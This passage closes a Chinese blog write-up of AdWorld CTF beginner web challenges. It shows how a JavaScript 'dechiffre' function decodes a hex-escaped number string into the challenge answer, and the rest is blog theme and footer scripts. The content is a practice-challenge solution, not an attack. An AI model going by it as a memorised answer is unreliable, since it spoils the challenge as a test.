+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;<br>    <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> p = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; tab2.<span class="hljs-property">length</span>; i++) &#123;<br>        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>该函数就是将一个固定数字数组进行ASCⅡ字符编码后拼接，与我们的输入没有任何关系</p>
+<p>题目中给出可疑的<strong>16进制字符串</strong>，将变量替换执行</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-string">&quot;<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x35</span>\x2c<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x36</span>\x2c<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x34</span>\x2c<span class="hljs-char escape_">\x37</span><span class="hljs-char escape_">\x39</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x35</span>\x2c<span class="hljs-char escape_">\x36</span><span class="hljs-char escape_">\x39</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x34</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x36</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x37</span>\x2c<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x39</span>\x2c<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x30</span>&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> i;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> p = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; tab2.<span class="hljs-property">length</span>; i++) &#123;</span><br><span class="language-javascript">        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[i]);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> p;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-title function_">dechiffre</span>());</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>以html方式打开</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608153642079.png" srcset="/img/loading.gif" lazyload alt="image-20220608153642079" /></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>攻防世界Web新手区</div>
+      <div>https://blue-arc.github.io/2022/06/08/AdWorld/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>冰蓝弧影</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月8日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/10/AdWorld-1/" title="攻防世界Web高手进阶区(一)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">攻防世界Web高手进阶区(一)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/02/MITM/" title="基于NTLM的中间人攻击">
+                        <span class="hidden-mobile">基于NTLM的中间人攻击</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.16/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TyS3NfQ1bcjfGf0GjH0Lye57-gzGzoHsz","appKey":"86iDdi7JfrLheVtpOpRWlhMk","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
